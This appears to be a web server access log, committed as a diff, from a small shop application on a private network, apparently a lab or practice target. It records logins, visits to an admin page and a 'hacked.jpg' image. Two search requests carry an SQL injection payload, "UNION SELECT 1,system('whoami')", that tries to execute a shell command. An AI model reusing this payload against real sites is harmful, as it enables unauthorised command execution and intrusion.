+2025-08-19 12:21:17,226 - 192.168.0.241 - - [19/Aug/2025 12:21:17] "[32mPOST /login HTTP/1.1[0m" 302 -
+2025-08-19 12:21:17,235 - 192.168.0.241 - - [19/Aug/2025 12:21:17] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-19 12:21:18,605 - 192.168.0.241 - - [19/Aug/2025 12:21:18] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-19 12:21:20,062 - 192.168.0.241 - - [19/Aug/2025 12:21:20] "GET /products HTTP/1.1" 200 -
+2025-08-19 12:21:20,099 - 192.168.0.241 - - [19/Aug/2025 12:21:20] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-19 12:21:20,100 - 192.168.0.241 - - [19/Aug/2025 12:21:20] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-19 12:21:26,110 - 192.168.0.241 - - [19/Aug/2025 12:21:26] "[32mGET /logout HTTP/1.1[0m" 302 -
+2025-08-19 12:21:26,116 - 192.168.0.241 - - [19/Aug/2025 12:21:26] "GET / HTTP/1.1" 200 -
+2025-08-19 12:21:27,006 - 192.168.0.241 - - [19/Aug/2025 12:21:27] "[32mGET /products HTTP/1.1[0m" 302 -
+2025-08-19 12:21:27,011 - 192.168.0.241 - - [19/Aug/2025 12:21:27] "GET /login HTTP/1.1" 200 -
+2025-08-19 12:21:30,732 - 192.168.0.241 - - [19/Aug/2025 12:21:30] "[32mPOST /login HTTP/1.1[0m" 302 -
+2025-08-19 12:21:30,739 - 192.168.0.241 - - [19/Aug/2025 12:21:30] "GET /products HTTP/1.1" 200 -
+2025-08-19 12:21:34,034 - 192.168.0.241 - - [19/Aug/2025 12:21:34] "GET /products?search='+UNION+SELECT+1,system('whoami')-- HTTP/1.1" 200 -
+2025-08-19 12:21:35,732 - 192.168.0.241 - - [19/Aug/2025 12:21:35] "[32mGET /logout HTTP/1.1[0m" 302 -
+2025-08-19 12:21:35,739 - 192.168.0.241 - - [19/Aug/2025 12:21:35] "GET / HTTP/1.1" 200 -
+2025-08-19 12:21:36,685 - 192.168.0.241 - - [19/Aug/2025 12:21:36] "[32mGET /products HTTP/1.1[0m" 302 -
+2025-08-19 12:21:36,692 - 192.168.0.241 - - [19/Aug/2025 12:21:36] "GET /login HTTP/1.1" 200 -
+2025-08-19 12:21:39,590 - 192.168.0.241 - - [19/Aug/2025 12:21:39] "[32mPOST /login HTTP/1.1[0m" 302 -
+2025-08-19 12:21:39,598 - 192.168.0.241 - - [19/Aug/2025 12:21:39] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-19 12:21:41,287 - 192.168.0.241 - - [19/Aug/2025 12:21:41] "GET /products HTTP/1.1" 200 -
+2025-08-19 12:21:41,401 - 192.168.0.241 - - [19/Aug/2025 12:21:41] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-19 12:21:41,405 - 192.168.0.241 - - [19/Aug/2025 12:21:41] "GET /info.jpg HTTP/1.1" 200 -
+2025-08-19 12:21:49,137 - 192.168.0.241 - - [19/Aug/2025 12:21:49] "GET /products?search='+UNION+SELECT+1,system('whoami')-- HTTP/1.1" 200 -
+2025-08-19 12:21:49,166 - 192.168.0.241 - - [19/Aug/2025 12:21:49] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-19 12:27:17,856 - 192.168.0.221 - - [19/Aug/2025 12:27:17] "GET /login HTTP/1.1" 200 -
+2025-08-19 12:27:18,076 - 192.168.0.221 - - [19/Aug/2025 12:27:18] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:27:18,079 - 192.168.0.221 - - [19/Aug/2025 12:27:18] "[36mGET /static/icons/apple-touch-icon.png HTTP/1.1[0m" 304 -
+2025-08-19 12:27:20,288 - 192.168.0.221 - - [19/Aug/2025 12:27:20] "GET /register HTTP/1.1" 200 -
+2025-08-19 22:14:50,966 - 192.168.0.241 - - [19/Aug/2025 22:14:50] "GET / HTTP/1.1" 200 -
+2025-08-19 22:14:53,143 - 192.168.0.241 - - [19/Aug/2025 22:14:53] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-19 22:14:55,739 - 192.168.0.241 - - [19/Aug/2025 22:14:55] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-19 22:14:57,659 - 192.168.0.241 - - [19/Aug/2025 22:14:57] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-19 22:15:27,752 - 192.168.0.241 - - [19/Aug/2025 22:15:27] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
